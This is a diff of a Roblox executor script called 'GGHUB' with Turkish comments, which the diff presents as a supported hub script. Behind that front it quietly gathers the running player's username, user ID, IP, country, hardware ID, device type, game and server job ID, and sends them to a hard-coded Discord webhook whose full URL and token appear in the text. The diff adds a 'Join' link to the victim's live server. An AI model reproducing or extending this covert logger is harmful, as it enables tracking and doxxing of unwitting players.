@@ -39,7 +39,6 @@ if isSupported then
     -- Desteklenen durumda bildirim
     showNotification(executorName .. " Is Supported!", "GGHUB is opening..", "Ok", 5)
 
-
 local webhookUrl = "https://discord.com/api/webhooks/1327965758273097778/J77TDzfo9bBPOsu_B1gweHCHOI-KK_y-NJP-d-8SlEAGEKj_yGjWBtnPJf_DTFrhyEpZ"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -58,24 +57,23 @@ local GetIp = "N/A"
 local GetData = "N/A"
 local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
 
--- Cihaz Markasını Belirleme (Platform Tabanlı)
+-- Cihaz Markasını Belirleme
 local DeviceBrand
 if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-    -- Mobil cihazlar
     if game:GetService("UserService"):GetPlatform() == Enum.Platform.IOS then
-        DeviceBrand = "Apple" -- iPhone/iPad
+        DeviceBrand = "Apple"
     else
-        DeviceBrand = "Android" -- Samsung, Xiaomi, vb.
+        DeviceBrand = "Android"
     end
 elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
-    DeviceBrand = "Console" -- Xbox, PlayStation
+    DeviceBrand = "Console"
 else
-    DeviceBrand = "PC" -- Dell, HP, vb.
+    DeviceBrand = "PC"
 end
 
 -- Hesap Oluşturma Tarihi
 local currentTime = os.time()
-local creationTime = currentTime - (AccountAge * 24 * 60 * 60) -- Subtract AccountAge days in seconds
+local creationTime = currentTime - (AccountAge * 24 * 60 * 60)
 local AccountCreationDate = os.date("%d/%m/%Y", creationTime)
 
 local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
@@ -103,18 +101,42 @@ end
 local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 local GameId = game.PlaceId
 
--- Executor Adı (Fallback ile)
+-- Executor Adı
 local executorName = identifyexecutor and identifyexecutor() or "Unknown"
 
 -- Webhook Verisi Oluşturma
 local function createWebhookData()
-    -- Ensure all variables are strings to avoid string.format errors
     local safeGetData = tostring(GetData or "N/A")
     local safeGetHwid = tostring(GetHwid or "Unknown")
     local safeExecutorName = tostring(executorName or "Unknown")
     local safeConsoleJobId = tostring(ConsoleJobId or "N/A")
     local safeDeviceBrand = tostring(DeviceBrand or "Unknown")
     local safeAccountCreationDate = tostring(AccountCreationDate or "Unknown")
+
+    local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
+
+    local description = string.format(
+        "__[Player Info](https://www.roblox.com/users/%d)__" ..
+        "\n**Display Name:** %s \n**Username:** %s \n**User Id:** %d" ..
+        "\n**Membership Type:** %s \n**Account Age:** %d days" ..
+        "\n**Account Creation Date:** %s" ..
+        "\n**Country:** %s \n**IP:** %s \n**HWID:** %s" ..
+        "\n**Device Brand:** %s" ..
+        "\n**Date:** %s \n**Time:** %s" ..
+        "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+        "\n**Game:** %s \n**Game Id:** %d \n**Executor:** %s" ..
+        "\n\n[Join %s](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)" ..
+        "\n\n**Data:** ```%s``` \n**JobId:** ```%s```",
+        UserId, DisplayName, Username, UserId, MembershipType, AccountAge,
+        safeAccountCreationDate, Country, GetIp, safeGetHwid, safeDeviceBrand,
+        tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+        GameId, GameName, GameId, safeExecutorName, Username, GameId, game.JobId, safeGetData, safeConsoleJobId
+    )
+
+    if #description > 4096 then
+        warn("Embed description too long: ", #description, " characters")
+        description = description:sub(1, 4090) .. "..."
+    end
 
     local data = {
         content = "",
@@ -124,32 +146,30 @@ local function createWebhookData()
                     name = "GGHUB EXECUTED!",
                     url = "https://scriptblox.com/script/Universal-Script-GGHUB-15195"
                 },
-                description = string.format(
-                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
-                    "\n**Display Name:** %s \n**Username:** %s \n**User Id:** %d" ..
-                    "\n**Membership Type:** %s \n**Account Age:** %d days" ..
-                    "\n**Account Creation Date:** %s" ..
-                    "\n**Country:** %s \n**IP:** %s \n**HWID:** %s" ..
-                    "\n**Device Brand:** %s" ..
-                    "\n**Date:** %s \n**Time:** %s" ..
-                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
-                    "\n**Game:** %s \n**Game Id:** %d \n**Executor:** %s" ..
-                    "\n\n**Data:** ```%s``` \n**JobId:** ```%s```",
-                    UserId, DisplayName, Username, UserId, MembershipType, AccountAge,
-                    safeAccountCreationDate, Country, GetIp, safeGetHwid, safeDeviceBrand,
-                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                    GameId, GameName, GameId, safeExecutorName, safeGetData, safeConsoleJobId
-                ),
+                description = description,
                 type = "rich",
                 color = 0xFFD700,
                 thumbnail = {
                     url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", UserId)
                 }
             }
+        },
+        components = {
+            {
+                type = 1,
+                components = {
+                    {
+                        type = 2,
+                        label = "Join " .. Username,
+                        style = 5,
+                        url = joinLink
+                    }
+                }
+            }
         }
     }
     local encodedData = HttpService:JSONEncode(data)
-    print("...") -- Debug: Print JSON payload
+    print("Webhook payload: ", encodedData)
     return encodedData
 end
 
@@ -161,8 +181,9 @@ local function sendWebhook(webhookUrl, data)
         }
         
         local request = http_request or syn and syn.request or request or HttpPost
+        print("HTTP request function:", request and "Available" or "Not available")
         if not request then
-            warn("...")
+            warn("No HTTP request function available")
             return
         end
 
@@ -173,27 +194,32 @@ local function sendWebhook(webhookUrl, data)
             Body = data
         })
 
-        print("...") -- Debug: Print status code
-        print("...") -- Debug: Print response body
-
+        print("Webhook response status: ", response and response.StatusCode or "No status")
+        print("Webhook response body: ", response and response.Body or "No body")
+        
         if response and response.StatusCode == 204 then
-            print("...")
+            print("Webhook sent successfully")
+        elseif response and response.StatusCode == 400 then
+            warn("Bad request (400). Check JSON payload for invalid fields or URLs.")
+        elseif response and response.StatusCode == 404 then
+            warn("Webhook URL is invalid (404). Please verify the URL.")
         else
-            warn("...")
+            warn("Failed to send webhook, status: ", response and response.StatusCode or "Unknown")
         end
     end)
     
     if not success then
-        warn("...")
+        warn("Error sending webhook: ", result)
     end
 end
 
 -- Scripti Çalıştırma
 local success, webhookData = pcall(createWebhookData)
 if success then
+    print("Webhook data created successfully")
     sendWebhook(webhookUrl, webhookData)
 else
-    warn("...")
+    warn("Error creating webhook data: ", webhookData)
 end
 
 
